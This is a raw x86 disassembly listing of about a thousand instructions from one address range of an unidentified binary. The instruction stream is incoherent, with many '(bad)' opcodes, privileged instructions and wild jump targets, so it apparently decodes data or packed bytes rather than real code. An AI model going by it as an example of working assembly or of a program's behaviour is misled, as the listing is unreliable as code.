  415b2f:	(bad)  
  415b30:	mov    esp,0x210803ed
  415b35:	pop    ss
  415b36:	es adc al,0x82
  415b39:	sub    eax,0xd204683f
  415b3e:	inc    edx
  415b3f:	bound  esp,QWORD PTR [eax]
  415b41:	shr    DWORD PTR [ecx],0x43
  415b44:	sbb    BYTE PTR [ebp+ecx*1+0x73],cl
  415b48:	pop    esp
  415b49:	dec    ebp
  415b4a:	arpl   WORD PTR [ecx],cx
  415b4c:	je     0x415bc5
  415b4e:	jp     0x415b1c
  415b50:	fild   WORD PTR [edi-0x21]
  415b53:	xchg   ebp,eax
  415b54:	out    0xab,eax
  415b56:	lods   al,BYTE PTR ds:[esi]
  415b57:	into   
  415b58:	dec    edx
  415b59:	test   eax,0x5afb12a7
  415b5e:	fidiv  DWORD PTR [esi+0x7da99ff1]
  415b64:	push   ebp
  415b65:	fsub   DWORD PTR [edi-0x4a014896]
  415b6b:	test   eax,0x69a55d2c
  415b70:	mov    eax,ds:0x299c9040
  415b75:	xor    eax,DWORD PTR [ebx-0x8]
  415b78:	pop    esi
  415b79:	sbb    eax,0xd61d9418
  415b7e:	push   ebp
  415b7f:	mov    gs,WORD PTR [eax]
  415b81:	rol    DWORD PTR [edi+0x5df93816],1
  415b87:	shr    BYTE PTR ds:0x3d4249dc,cl
  415b8d:	inc    esp
  415b8e:	rcl    BYTE PTR [edi-0x311355e4],0x79
  415b95:	dec    eax
  415b96:	jmp    0x415b44
  415b98:	hlt    
  415b99:	xchg   ecx,eax
  415b9a:	inc    esi
  415b9b:	mov    dh,0x1d
  415b9d:	fwait
  415b9e:	clc    
  415b9f:	dec    edx
  415ba0:	shr    DWORD PTR [esi+0x4a1dc9e5],1
  415ba6:	gs xchg ebx,eax
  415ba8:	lods   al,BYTE PTR ds:[esi]
  415ba9:	jmp    0xfec5d51b
  415bae:	push   es
  415baf:	addr16 cli 
  415bb1:	pop    edi
  415bb2:	leave  
  415bb3:	loopne 0x415b93
  415bb5:	cld    
  415bb6:	xor    bh,BYTE PTR [ecx-0x68]
  415bb9:	(bad)  
  415bbb:	xchg   ecx,eax
  415bbc:	push   edx
  415bbd:	xor    bh,BYTE PTR [edi]
  415bbf:	adc    cl,BYTE PTR [eax+ecx*1-0x252ddee8]
  415bc6:	mov    ds:0x366a7545,eax
  415bcb:	jns    0x415c17
  415bcd:	scas   eax,DWORD PTR es:[edi]
  415bce:	hlt    
  415bcf:	or     eax,0xafb89ac4
  415bd4:	inc    esp
  415bd5:	fs cmp eax,0xa76b2d26
  415bdb:	ja     0x415c4c
  415bdd:	xor    eax,0x8c18d656
  415be2:	es loopne 0x415b70
  415be5:	pop    ds
  415be6:	sub    ebp,DWORD PTR [ecx]
  415be8:	js     0x415b81
  415bea:	push   esp
  415beb:	std    
  415bec:	sbb    eax,0x2376dd71
  415bf1:	outs   dx,DWORD PTR ds:[esi]
  415bf2:	aad    0x2c
  415bf4:	mov    bh,0x94
  415bf6:	outs   dx,BYTE PTR ds:[esi]
  415bf7:	add    DWORD PTR [eax-0x2d4f2768],edx
  415bfd:	pop    es
  415bfe:	icebp  
  415bff:	into   
  415c00:	pop    eax
  415c01:	test   al,0xd2
  415c03:	scas   eax,DWORD PTR es:[edi]
  415c04:	clc    
  415c05:	in     al,0x53
  415c07:	add    eax,0x9cdc0a48
  415c0c:	clc    
  415c0d:	or     ebp,DWORD PTR [ecx]
  415c0f:	mov    al,ds:0x473b6db1
  415c14:	and    ah,BYTE PTR [esi+edi*2+0x25]
  415c18:	sub    ch,BYTE PTR [ecx+0x60eea407]
  415c1e:	cmc    
  415c1f:	invd   
  415c21:	xor    ebp,0x4b0c674c
  415c27:	sahf   
  415c28:	xlat   BYTE PTR ds:[ebx]
  415c29:	cs add BYTE PTR cs:[edx-0x2231ed6b],0x3b
  415c32:	lods   al,BYTE PTR ds:[esi]
  415c33:	test   eax,0xf67caf19
  415c38:	push   esp
  415c39:	ja     0x415c09
  415c3b:	lods   al,BYTE PTR ds:[esi]
  415c3c:	and    esi,DWORD PTR [esi-0x7d]
  415c3f:	mov    WORD PTR [edi+0x1c],gs
  415c42:	jns    0x415ca1
  415c44:	imul   esi,esp,0x84c37c77
  415c4a:	nop
  415c4b:	(bad)  [esi+0x477a97c3]
  415c51:	jmp    0x5ecb71b9
  415c56:	xchg   esi,eax
  415c57:	mov    ?,esp
  415c59:	js     0x415c4c
  415c5b:	mov    fs,WORD PTR ds:0x8c244795
  415c61:	mov    edi,0x62cc9a67
  415c66:	push   esi
  415c67:	std    
  415c68:	imul   ebx,DWORD PTR [edx],0x7b9a9508
  415c6e:	cmc    
  415c6f:	adc    al,0xd6
  415c71:	add    BYTE PTR ds:0x873b6b50,al
  415c77:	mov    ds:0x7001b3c9,al
  415c7c:	sti    
  415c7d:	pushf  
  415c7e:	dec    ecx
  415c7f:	mov    ds:0xfc756b10,eax
  415c84:	jge    0x415cdb
  415c86:	ss iret 
  415c88:	adc    DWORD PTR [edx-0x12],eax
  415c8b:	aam    0xad
  415c8d:	pop    DWORD PTR [edi+0x7a]
  415c90:	jne    0x415c1d
  415c92:	pop    ds
  415c93:	dec    eax
  415c94:	mov    edi,0xcc68da67
  415c99:	stc    
  415c9a:	lahf   
  415c9b:	inc    eax
  415c9c:	mov    dl,0x3f
  415c9e:	(bad)  
  415c9f:	cwde   
  415ca0:	outs   dx,BYTE PTR ds:[esi]
  415ca1:	fsubrp st(2),st
  415ca3:	arpl   WORD PTR [ecx],di
  415ca5:	sbb    DWORD PTR [ecx-0xf],esp
  415ca8:	push   ebp
  415ca9:	loop   0x415c9c
  415cab:	pop    ebx
  415cac:	ins    BYTE PTR es:[edi],dx
  415cad:	and    al,0xcf
  415caf:	ds push cs
  415cb1:	push   ebx
  415cb2:	aaa    
  415cb3:	ret    
  415cb4:	out    0xe9,eax
  415cb6:	fsub   DWORD PTR [eax]
  415cb8:	mov    edx,0xcd27b6a2
  415cbd:	ja     0x415d3a
  415cbf:	dec    edi
  415cc0:	lods   al,BYTE PTR ds:[esi]
  415cc1:	adc    BYTE PTR [ebx+0x1ca1fccb],dh
  415cc7:	inc    eax
  415cc8:	mov    BYTE PTR [ebp+0x3c],cl
  415ccb:	sti    
  415ccc:	adc    BYTE PTR [esi+0x44],dh
  415ccf:	inc    esp
  415cd0:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  415cd2:	mov    dh,0xb3
  415cd4:	fild   WORD PTR ss:[ecx]
  415cd7:	and    edi,esi
  415cd9:	hlt    
  415cda:	(bad)  
  415cdb:	or     BYTE PTR [eax-0x80],ch
  415cde:	into   
  415cdf:	dec    edi
  415ce0:	test   al,0xf3
  415ce2:	lods   al,BYTE PTR ds:[esi]
  415ce3:	sbb    DWORD PTR ds:0x5779d26f,esp
  415ce9:	cmp    eax,0x719c45b4
  415cee:	jge    0x415cdb
  415cf0:	fwait
  415cf1:	ss popf 
  415cf3:	xor    BYTE PTR [edi+edi*1+0x37d56110],0x1e
  415cfb:	push   cs
  415cfc:	lea    eax,[ecx+edi*4]
  415cff:	xlat   BYTE PTR ds:[ebx]
  415d00:	rol    ch,0x9
  415d03:	les    ebp,FWORD PTR [edx+0x137ae4cd]
  415d09:	shl    edi,1
  415d0b:	fsubr  st(6),st
  415d0d:	inc    ecx
  415d0e:	mov    esp,ecx
  415d10:	ret    
  415d11:	mov    cl,0xdb
  415d13:	ins    DWORD PTR es:[edi],dx
  415d14:	pop    ds
  415d15:	cmp    eax,0x84d6ce84
  415d1a:	test   al,0x2d
  415d1c:	and    al,BYTE PTR [edi-0x1dab2c53]
  415d22:	push   eax
  415d23:	add    bl,BYTE PTR [eax-0x48c6235c]
  415d29:	scas   al,BYTE PTR es:[edi]
  415d2a:	add    edi,DWORD PTR [eax+ebx*4+0x43]
  415d2e:	push   ebp
  415d2f:	mov    bl,0x1
  415d31:	fimul  WORD PTR [ecx+0x48b623db]
  415d37:	dec    esi
  415d38:	cmc    
  415d39:	pop    ds
  415d3a:	mov    ecx,esi
  415d3c:	jp     0x415d98
  415d3e:	mov    ds:0x7f856d27,eax
  415d43:	enter  0x5640,0x12
  415d47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d48:	sub    eax,edi
  415d4a:	popf   
  415d4b:	xchg   ecx,eax
  415d4c:	jge    0x415d70
  415d4e:	adc    DWORD PTR [edx],ebx
  415d50:	iret   
  415d51:	add    ebp,edx
  415d53:	rcr    BYTE PTR [eax],1
  415d55:	adc    eax,0xce15786
  415d5a:	adc    ch,BYTE PTR [eax]
  415d5c:	addr16 xchg esp,eax
  415d5e:	addr16 adc dl,ah
  415d61:	mov    BYTE PTR [esi-0xc905e40],0x18
  415d68:	push   eax
  415d69:	popf   
  415d6a:	out    0xdb,al
  415d6c:	dec    esi
  415d6d:	int    0xe
  415d6f:	mov    ebp,0xd8881b3e
  415d74:	jns    0x415d84
  415d76:	fscale 
  415d78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d79:	out    dx,eax
  415d7a:	xchg   ecx,eax
  415d7b:	clc    
  415d7c:	aas    
  415d7d:	sub    BYTE PTR [eax],0x13
  415d80:	jnp    0x415d93
  415d82:	xchg   esp,eax
  415d83:	add    eax,0xa54923a1
  415d88:	and    DWORD PTR [edx-0x24],ebp
  415d8b:	scas   eax,DWORD PTR es:[edi]
  415d8c:	mov    dl,0x5e
  415d8e:	dec    esp
  415d8f:	sbb    al,0xc
  415d91:	mov    al,ds:0x15894e7c
  415d96:	mov    al,ds:0xb1928554
  415d9b:	sahf   
  415d9c:	mov    bl,0x1a
  415d9e:	or     ch,BYTE PTR [edi]
  415da0:	mov    al,0x73
  415da2:	(bad)  
  415da3:	fimul  DWORD PTR [edx+eax*2+0x2b3ee6e5]
  415daa:	xchg   esi,eax
  415dab:	into   
  415dac:	or     al,0xf3
  415dae:	outs   dx,DWORD PTR ds:[esi]
  415daf:	sub    al,0xcb
  415db1:	pop    eax
  415db2:	(bad)  
  415db3:	xchg   ebp,eax
  415db4:	mov    cs,WORD PTR [edx-0x76]
  415db7:	arpl   WORD PTR [edx+0xafca4ff],sp
  415dbd:	mov    cl,0x9e
  415dbf:	(bad)  
  415dc0:	dec    edx
  415dc1:	cmp    DWORD PTR [edx-0x2fceba14],0xffffffcd
  415dc8:	dec    ecx
  415dc9:	xchg   esi,eax
  415dca:	jmp    0x415d93
  415dcc:	jmp    0xe053:0xdf7f6243
  415dd3:	(bad)  
  415dd4:	jp     0x415e13
  415dd6:	pop    esp
  415dd7:	cmp    eax,0xbd56908f
  415ddc:	nop
  415ddd:	or     BYTE PTR [ebx-0x4b21b514],ah
  415de3:	mov    ah,0x6d
  415de5:	mov    bl,0x4f
  415de7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415de8:	mov    dh,0x77
  415dea:	push   ebp
  415deb:	pushf  
  415dec:	outs   dx,DWORD PTR ds:[esi]
  415ded:	outs   dx,DWORD PTR ds:[esi]
  415dee:	sub    eax,0xae4621a
  415df3:	cmp    ebp,esi
  415df5:	or     BYTE PTR [ecx],dh
  415df7:	enter  0x7eb7,0xa5
  415dfb:	push   0x5b
  415dfd:	int3   
  415dfe:	xchg   ebp,eax
  415dff:	xor    al,0x53
  415e01:	retf   0xe10a
  415e04:	pop    ebx
  415e05:	test   BYTE PTR [ebp-0x5fbbaf6a],cl
  415e0b:	clc    
  415e0c:	xchg   ebp,eax
  415e0d:	dec    ebx
  415e0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e0f:	call   0x5645e3ae
  415e14:	inc    esp
  415e15:	push   ebp
  415e16:	xchg   BYTE PTR [edi+ecx*1+0x47],cl
  415e1a:	fwait
  415e1b:	sub    BYTE PTR [ecx-0xb50fbe1],cl
  415e21:	dec    ebx
  415e22:	mov    ebx,0x641e3646
  415e27:	repnz retf 
  415e29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e2a:	inc    edx
  415e2b:	lods   al,BYTE PTR ds:[esi]
  415e2c:	(bad)  
  415e2f:	stc    
  415e30:	in     eax,0xa1
  415e32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415e33:	inc    ebx
  415e34:	pop    ebp
  415e36:	add    al,0xea
  415e38:	out    0x73,al
  415e3a:	in     eax,0x87
  415e3c:	or     DWORD PTR [edi-0x1e],esp
  415e3f:	retf   
  415e40:	or     BYTE PTR [ebp-0x5d],cl
  415e43:	adc    esi,DWORD PTR [esi+0x34bee7be]
  415e49:	lahf   
  415e4a:	push   ds
  415e4b:	sub    eax,0xaf194d15
  415e50:	test   eax,0x5c491a24
  415e55:	xor    bh,BYTE PTR [ecx+ebp*1-0x3c]
  415e59:	adc    bh,dl
  415e5b:	cs ja  0x415ea6
  415e5e:	push   edi
  415e5f:	xor    esp,DWORD PTR [ecx-0x465e1f44]
  415e65:	rcl    DWORD PTR [edi],0x99
  415e68:	sub    dh,cl
  415e6a:	es xchg ebx,eax
  415e6c:	jmp    0xc25c:0x542230b6
  415e73:	mov    ds:0x4febb70a,eax
  415e78:	cmc    
  415e79:	in     al,dx
  415e7a:	mov    dh,BYTE PTR ds:0xbb8ad008
  415e80:	push   cs
  415e81:	arpl   di,dx
  415e83:	lea    ebp,[eax+0x3d]
  415e86:	(bad)  
  415e87:	(bad)  
  415e88:	ror    edx,cl
  415e8a:	inc    DWORD PTR [ebp+esi*2+0x4b]
  415e8e:	or     al,0x32
  415e90:	adc    eax,0xa603894f
  415e95:	push   edi
  415e96:	cdq    
  415e97:	das    
  415e98:	test   DWORD PTR [eax+0x38],esi
  415e9b:	xchg   edi,eax
  415e9c:	stc    
  415e9d:	dec    ebp
  415e9e:	test   BYTE PTR [ebp+0x2e],ch
  415ea1:	icebp  
  415ea2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ea3:	adc    al,0x8e
  415ea5:	enter  0x53b0,0x21
  415ea9:	fdiv   DWORD PTR [edi+0x2a]
  415eac:	pop    eax
  415ead:	fs inc ebp
  415eaf:	rcr    DWORD PTR ds:0x538c64e,0x2d
  415eb6:	dec    edx
  415eb7:	dec    ebp
  415eb8:	mov    edi,0x5508715a
  415ebd:	aaa    
  415ebe:	xchg   edi,eax
  415ebf:	and    eax,0x9de37f01
  415ec4:	xor    al,0x43
  415ec6:	cmp    DWORD PTR [ebp+ecx*4-0x6f],0xffffffdd
  415ecb:	push   ebp
  415ecc:	adc    eax,0x5f1102dd
  415ed1:	in     al,0x4f
  415ed3:	sub    dh,BYTE PTR [ecx]
  415ed5:	scas   al,BYTE PTR es:[edi]
  415ed6:	rcl    DWORD PTR [edx+0x5d04489a],1
  415edc:	dec    esp
  415edd:	add    DWORD PTR [ebp-0x36],edx
  415ee0:	pop    ss
  415ee1:	je     0x415f10
  415ee3:	ret    0x6bc5
  415ee6:	or     cl,BYTE PTR [edx-0x599b4bcf]
  415eec:	dec    ebx
  415eed:	sbb    ebp,DWORD PTR [di+0x224d]
  415ef2:	rcl    DWORD PTR [edi],cl
  415ef4:	sbb    BYTE PTR [eax],bh
  415ef6:	dec    ebx
  415ef7:	(bad)  
  415ef8:	sub    al,0xfc
  415efa:	push   edi
  415efb:	loopne 0x415f4f
  415efd:	lahf   
  415efe:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  415f00:	push   cs
  415f01:	lods   al,BYTE PTR ds:[esi]
  415f02:	js     0x415ef3
  415f04:	or     eax,0xc1d6f8
  415f09:	out    dx,al
  415f0a:	jle    0x415e9b
  415f0c:	repnz lds ebx,FWORD PTR [eax+0x14f971e8]
  415f13:	stos   DWORD PTR es:[edi],eax
  415f14:	xor    al,0xec
  415f16:	shl    DWORD PTR [ebx+0x7e],cl
  415f19:	sbb    eax,0x3518bb8c
  415f1e:	inc    ebx
  415f1f:	rcr    DWORD PTR [edi-0x40],0xb6
  415f23:	repnz add BYTE PTR [edx+0x7a],cl
  415f27:	inc    ebx
  415f28:	gs xchg esp,eax
  415f2a:	inc    ebp
  415f2b:	and    eax,0xccdfd904
  415f30:	dec    edi
  415f31:	aaa    
  415f32:	pop    ss
  415f33:	lods   eax,DWORD PTR ds:[esi]
  415f34:	pop    esi
  415f35:	aam    0xa6
  415f37:	out    0xf8,eax
  415f39:	sub    DWORD PTR [edx+0x1a],ebp
  415f3c:	scas   eax,DWORD PTR es:[edi]
  415f3d:	sbb    DWORD PTR ds:0x78a54a14,0x77aa2ffa
  415f47:	loop   0x415f85
  415f49:	dec    edx
  415f4a:	mov    ebx,0xac73248
  415f4f:	outs   dx,DWORD PTR ds:[esi]
  415f50:	test   eax,0x187cde2e
  415f55:	xchg   edi,eax
  415f56:	je     0x415f7f
  415f58:	mov    al,0xea
  415f5a:	mov    esp,0xa4d27325
  415f5f:	adc    eax,0xdfa99c0f
  415f64:	or     BYTE PTR [ebx+0x335e01ce],0x40
  415f6b:	mov    esp,0x9bf1c9e5
  415f70:	mov    si,0xb38
  415f74:	shl    DWORD PTR [edi+0x7b],0x10
  415f78:	inc    esi
  415f79:	add    eax,0xe4cca86d
  415f7e:	jo     0x415fa6
  415f80:	mov    edi,0xffc6ad3f
  415f85:	(bad)  
  415f86:	lds    esp,FWORD PTR [edi+ebp*2]
  415f89:	(bad)  
  415f8a:	nop
  415f8b:	(bad)  
  415f8c:	rcl    BYTE PTR [esi+0x55],0x4c
  415f90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f91:	mov    ah,BYTE PTR [edx-0x22]
  415f94:	div    eax
  415f96:	mov    al,BYTE PTR [eax]
  415f98:	leave  
  415f99:	pop    edx
  415f9a:	pop    es
  415f9b:	enter  0x7ccf,0x9c
  415f9f:	je     0x415f33
  415fa1:	aas    
  415fa2:	xor    sp,si
  415fa5:	jp     0x415f47
  415fa7:	or     bl,BYTE PTR [ecx+0x72]
  415faa:	nop
  415fab:	daa    
  415fac:	neg    DWORD PTR [edx-0x73a9bdf9]
  415fb2:	ret    
  415fb3:	add    cl,BYTE PTR [edx+0x26a81de2]
  415fb9:	loop   0x415f9f
  415fbb:	sahf   
  415fbc:	mov    ebx,DWORD PTR [ecx-0xaa0e27b]
  415fc2:	add    BYTE PTR [eax-0x5154ced3],0x9c
  415fc9:	xchg   BYTE PTR ds:0x5918cbd9,ah
  415fcf:	or     BYTE PTR [ebp+0x64],ch
  415fd2:	icebp  
  415fd3:	cmp    ch,BYTE PTR [edx+0x4b]
  415fd6:	int    0x88
  415fd8:	int    0xb
  415fda:	leave  
  415fdb:	or     eax,0x67886142
  415fe0:	xchg   DWORD PTR [edx-0x74],ebx
  415fe3:	add    eax,0xfa3247a7
  415fe8:	sbb    eax,0x7c36a8e6
  415fed:	lods   al,BYTE PTR ds:[esi]
  415fee:	push   esp
  415fef:	fs mov ah,0x73
  415ff2:	xor    dl,BYTE PTR [edx+0x3]
  415ff5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415ff6:	icebp  
  415ff7:	mov    dl,0xa3
  415ff9:	inc    ah
  415ffb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ffc:	push   ebp
  415ffd:	mov    al,ds:0x8555cab7
  416002:	ja     0x416062
  416004:	aas    
  416005:	xchg   esp,ebp
  416007:	iret   
  416008:	outs   dx,DWORD PTR ds:[esi]
  416009:	mov    eax,0x664a6de6
  41600e:	inc    ecx
  41600f:	fwait
  416010:	mov    al,0xc5
  416012:	test   DWORD PTR [edi-0x6c],0x744a5fbc
  416019:	popf   
  41601a:	mov    esp,0x49ed722d
  41601f:	jg     0x415fda
  416021:	test   al,0x19
  416023:	(bad)  
  416024:	jecxz  0x415fd3
  416026:	mov    eax,0xa03b6d88
  41602b:	xchg   ecx,eax
  41602c:	or     esp,ebx
  41602e:	jne    0x416022
  416030:	xor    DWORD PTR [esp+edx*2+0x3dc76c0c],0x26d30170
  41603b:	pop    edi
  41603c:	jmp    0x41606a
  41603e:	inc    ecx
  41603f:	and    al,0xaf
  416041:	and    DWORD PTR [ebp-0x78efb874],ebx
  416047:	test   al,0x1e
  416049:	mov    ebp,0xf945857e
  41604e:	xchg   esp,eax
  41604f:	push   ds
  416050:	ds loopne 0x416027
  416053:	adc    eax,0x65eeeb30
  416058:	ss push esi
  41605a:	or     eax,0x4b837950
  41605f:	jno    0x4160b8
  416061:	pop    ebp
  416062:	and    BYTE PTR [esi+eiz*4+0x54],cl
  416066:	in     eax,dx
  416067:	jmp    0xc537:0xd11e76cb
  41606e:	mov    esi,0x9468c7cb
  416073:	sbb    BYTE PTR [ebp+0x80e644d],0x63
  41607a:	add    al,0x47
  41607c:	call   0xa56fd965
  416081:	ror    DWORD PTR [edi-0x77],1
  416084:	add    bl,ch
  416086:	les    esp,FWORD PTR [edi-0x27]
  416089:	inc    ebx
  41608a:	mov    esi,0xece62b7d
  41608f:	in     eax,0xe7
  416091:	xchg   edx,eax
  416092:	loop   0x41608c
  416094:	push   0x6a
  416096:	inc    ecx
  416097:	jne    0x416071
  416099:	or     esp,ecx
  41609b:	clc    
  41609c:	int    0x5
  41609e:	push   0x36
  4160a0:	xor    ebx,edx
  4160a2:	lfs    esp,FWORD PTR [ecx+0x45773006]
  4160a9:	ror    bl,0x62
  4160ac:	push   edi
  4160ad:	or     eax,0xcf937832
  4160b2:	or     ecx,ebp
  4160b4:	sub    ecx,DWORD PTR [esi]
  4160b6:	inc    edx
  4160b7:	sbb    eax,DWORD PTR [ecx+edx*8-0x2562f999]
  4160be:	jne    0x41613f
  4160c0:	and    BYTE PTR [ecx],dh
  4160c2:	loop   0x416093
  4160c4:	push   0x44504092
  4160c9:	inc    edx
  4160ca:	outs   dx,DWORD PTR ds:[esi]
  4160cb:	sbb    BYTE PTR [eax],al
  4160cd:	sbb    BYTE PTR [ebx],cl
  4160cf:	(bad)  
  4160d0:	sahf   
  4160d1:	xor    ecx,DWORD PTR [ebx-0x22]
  4160d4:	jmp    ecx
  4160d6:	mov    ds:0x86a5c427,al
  4160db:	jb     0x41608f
  4160dd:	dec    esi
  4160de:	jmp    0x416081
  4160e0:	mov    DWORD PTR [ebx-0x2104e893],edi
  4160e6:	repnz cmp eax,0xa1b382f2
  4160ec:	lock repnz in al,0x1a
  4160f0:	add    dh,BYTE PTR [esi]
  4160f2:	xor    eax,ebx
  4160f4:	bound  ebp,QWORD PTR [esi-0x213919bf]
  4160fa:	cmp    esp,DWORD PTR [ebp+0x64]
  4160fd:	out    dx,al
  4160fe:	xor    BYTE PTR [edx+0x0],dl
  416101:	cdq    
  416102:	sub    eax,0x1fe4d8d8
  416107:	shl    DWORD PTR [esi-0x267cd66e],0x99
  41610e:	inc    eax
  41610f:	mov    al,0x8b
  416111:	es stos BYTE PTR es:[edi],al
  416113:	enter  0xba20,0x52
  416117:	popa   
  416118:	fsubr  QWORD PTR [ecx]
  41611a:	ror    DWORD PTR [esi-0x3e],cl
  41611d:	pop    ebx
  41611e:	mov    ecx,0x459fecc
  416123:	arpl   si,cx
  416125:	inc    esp
  416126:	fld    st(5)
  416128:	sar    DWORD PTR [ebx+0x2be3503a],cl
  41612e:	add    al,0x18
  416130:	iret   
  416131:	push   0xffffff8f
  416133:	cmp    DWORD PTR [edx],ebp
  416135:	mov    eax,0x521ab921
  41613a:	xchg   BYTE PTR [esp+ebx*8+0x7a812a2a],bl
  416141:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416142:	in     eax,dx
  416143:	ret    
  416144:	sbb    al,0x65
  416146:	sbb    cl,bl
  416148:	cli    
  416149:	or     esi,eax
  41614b:	cwde   
  41614c:	add    ebx,DWORD PTR [ebx-0x253bcf8]
  416152:	(bad)
  416156:	popa   
  416157:	push   ecx
  416158:	mov    fs,WORD PTR [esi-0x6aa5b3c3]
  41615e:	fdivr  QWORD PTR [edi]
  416160:	hlt    
  416161:	adc    edx,DWORD PTR [ebp-0x639e68b]
  416167:	jns    0x4161b4
  416169:	dec    ebp
  41616a:	mov    ecx,0xcfbae483
  41616f:	cmp    eax,0xb7977a2
  416174:	sub    DWORD PTR [edi+ecx*8-0x63555c88],eax
  41617b:	pop    esp
  41617c:	sub    edx,DWORD PTR [ebx-0x1bf37b33]
  416182:	add    BYTE PTR ds:0x9b6bc4de,dh
  416188:	jl     0x4161ee
  41618a:	sub    cl,ch
  41618c:	mov    eax,0xfd66a4ec
  416191:	pop    edx
  416192:	popf   
  416193:	jp     0x416119
  416195:	sub    BYTE PTR [ebx+0x4ea7ab68],dh
  41619b:	adc    eax,0xb91cbcbf
  4161a0:	xor    ch,BYTE PTR [esi+0x43]
  4161a3:	push   ebp
  4161a4:	mov    bh,0x13
  4161a6:	xor    DWORD PTR [ecx-0x2c19cb36],esi
  4161ac:	add    BYTE PTR [edi-0x6d6b7fd0],0x6b
  4161b3:	push   ebx
  4161b4:	scas   al,BYTE PTR es:[edi]
  4161b5:	xor    esi,DWORD PTR [esi-0x42b4d8e8]
  4161bb:	mov    al,0x10
  4161bd:	jo     0x416183
  4161bf:	cmc    
  4161c0:	adc    eax,0xa2fd2a69
  4161c5:	stos   BYTE PTR es:[edi],al
  4161c6:	jnp    0x4161e3
  4161c8:	stc    
  4161c9:	(bad)  
  4161ca:	out    dx,al
  4161cb:	jmp    0x88a91b10
  4161d0:	cmp    edx,DWORD PTR [ecx-0x4c848aca]
  4161d6:	lods   eax,DWORD PTR ds:[esi]
  4161d7:	dec    ecx
  4161d8:	xchg   DWORD PTR [ebp+0x7df1d4ae],eax
  4161de:	nop    ebp
  4161e1:	call   0xaef94a91
  4161e6:	loop   0x4161c8
  4161e8:	test   BYTE PTR [ecx+ebx*4],bl
  4161eb:	adc    bh,BYTE PTR [ebp+0xd]
  4161ee:	fcmovne st,st(2)
  4161f0:	or     al,0x86
  4161f2:	out    0x53,al
  4161f4:	stc    
  4161f5:	(bad)  
  4161f6:	cmp    bl,BYTE PTR [esp+ebx*8]
  4161f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4161fa:	push   ss
  4161fb:	popa   
  4161fc:	fld    DWORD PTR [edx]
  4161fe:	daa    
  4161ff:	inc    esi
  416200:	repnz add eax,0xf0c0c561
  416206:	or     ch,BYTE PTR [edx+0x53]
  416209:	aad    0xf6
  41620b:	(bad)  
  41620c:	hlt    
  41620d:	xchg   cl,ch
  41620f:	cmp    al,0x35
  416211:	sahf   
  416212:	ds sbb eax,0xe4af9edc
  416218:	or     bh,BYTE PTR [ebx]
  41621a:	push   0x17
  41621c:	mov    al,ds:0xb566934c
  416221:	xchg   esi,eax
  416222:	pop    ss
  416223:	or     DWORD PTR [ebp+0x6b],esi
  416226:	mul    BYTE PTR [eax]
  416228:	xor    ah,BYTE PTR [eax-0x144f63ff]
  41622e:	leave  
  41622f:	leave  
  416230:	sub    DWORD PTR [esi+ebx*4],0x98853c87
  416237:	mov    tr3,eax
  41623a:	pop    ss
  41623b:	outs   dx,DWORD PTR ds:[esi]
  41623c:	jl     0x4161f4
  41623e:	sbb    eax,0xc5173ffc
  416243:	xchg   ebx,eax
  416244:	fsub   DWORD PTR [ecx-0x71]
  416247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416248:	das    
  416249:	js     0x4161f7
  41624b:	lahf   
  41624c:	sbb    BYTE PTR [esi-0x60646c1a],0x2e
  416253:	adc    al,0xe0
  416255:	sub    al,0x11
  416257:	sar    DWORD PTR ds:0xff7e405f,1
  41625d:	lods   al,BYTE PTR ds:[esi]
  41625e:	lahf   
  41625f:	cmp    DWORD PTR [ebp+0x1d877810],0xffffffab
  416266:	push   0xf64a3f15
  41626b:	sub    DWORD PTR ds:0x461d9f0b,esi
  416271:	mov    eax,0x7f84a69f
  416276:	mov    ecx,0x2ba6ae98
  41627b:	loop   0x416230
  41627d:	fs mov ah,0x70
  416281:	cmp    dh,dh
  416283:	cmp    al,0xde
  416285:	sub    DWORD PTR [ebx-0xfe3997f],ebx
  41628b:	mov    ch,0x62
  41628d:	loope  0x416211
  41628f:	sbb    BYTE PTR [ecx+0x5214d526],ch
  416295:	jne    0x416309
  416297:	xchg   esp,eax
  416298:	add    DWORD PTR [ebx-0x40633b3f],ebx
  41629e:	test   BYTE PTR [ecx+0x35],dh
  4162a1:	popf   
  4162a2:	xor    dl,BYTE PTR [ebp-0x2a985b4c]
  4162a8:	arpl   bp,ax
  4162aa:	cdq    
  4162ab:	ret    0xdb70
  4162ae:	dec    eax
  4162af:	test   BYTE PTR [ebx-0x71a83fd6],0x94
  4162b6:	mov    edx,0x4e0f7d95
  4162bb:	enter  0x9f01,0x6f
  4162bf:	inc    esi
  4162c0:	dec    esi
  4162c1:	sub    al,ch
  4162c3:	ret    0xc2f9
  4162c6:	mov    ds:0x1eace117,eax
  4162cb:	sti    
  4162cc:	mov    gs,WORD PTR [edx-0x7c]
  4162cf:	mov    ds:0xfd3cdade,al
  4162d4:	inc    eax
  4162d5:	fnstenv [ebx]
  4162d7:	dec    esi
  4162d8:	mov    ebx,0x6232e06
  4162dd:	call   0x75fb:0x3bf74b65
  4162e4:	hlt    
  4162e5:	fiadd  DWORD PTR [edx+0x6ab0301b]
  4162eb:	ss push 0x1e
  4162ee:	mov    dl,0x53
  4162f0:	cmp    eax,0x606463f4
  4162f5:	cs inc ebp
  4162f7:	push   ss
  4162f8:	adc    ebx,ebx
  4162fa:	(bad)  
  4162fb:	sahf   
  4162fc:	test   eax,0xaae4bbaf
  416301:	rol    DWORD PTR [ebx-0x7f],0xf1
  416305:	lods   al,BYTE PTR ds:[esi]
  416306:	mov    esp,0x7ae04fbc
  41630b:	(bad)  
  41630c:	sbb    edx,DWORD PTR [eax+edi*2-0x72]
  416310:	je     0x41638c
  416312:	loope  0x41633d
  416314:	lahf   
  416315:	das    
  416316:	(bad)  
